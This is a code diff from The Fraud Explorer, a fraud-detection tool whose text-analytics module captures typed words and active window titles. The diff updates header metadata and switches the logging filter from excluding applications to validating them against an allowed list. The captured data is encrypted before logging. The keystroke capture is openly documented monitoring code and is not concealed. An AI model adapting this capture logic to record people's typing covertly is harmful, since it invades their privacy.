@@ -2,13 +2,13 @@
  * The Fraud Explorer
  * https://www.thefraudexplorer.com/
  *
- * Copyright (c) 2014-2020 The Fraud Explorer
+ * Copyright (c) 2014-2021 The Fraud Explorer
  * email: support@thefraudexplorer.com
  * Licensed under GNU GPL v3
  * https://www.thefraudexplorer.com/License
  *
- * Date: 2020-08
- * Revision: v2.0.3-aim
+ * Author: jrios@nofraud.la
+ * Version code-name: nemesis
  *
  * Description: Text Analytics
  */
@@ -172,7 +172,7 @@ namespace TFE_core.Analytics
                         
                             // Send whole word
 
-                            if (KeyboardWord.Length >= 1 && TextHelpers.WordsSanitizer(KeyboardWord) && !TextHelpers.AppsExclusion(ActiveApplTitle()))
+                            if (KeyboardWord.Length >= 1 && TextHelpers.WordsSanitizer(KeyboardWord) && TextHelpers.AppsValidation(ActiveApplTitle()))
                             {
                                 log4net.GlobalContext.Properties["TextWindow"] = Cryptography.EncRijndael(TextHelpers.RemoveDiacritics(ActiveApplTitle()));
                                 log4net.GlobalContext.Properties["Word"] = Cryptography.EncRijndael(KeyboardWord);
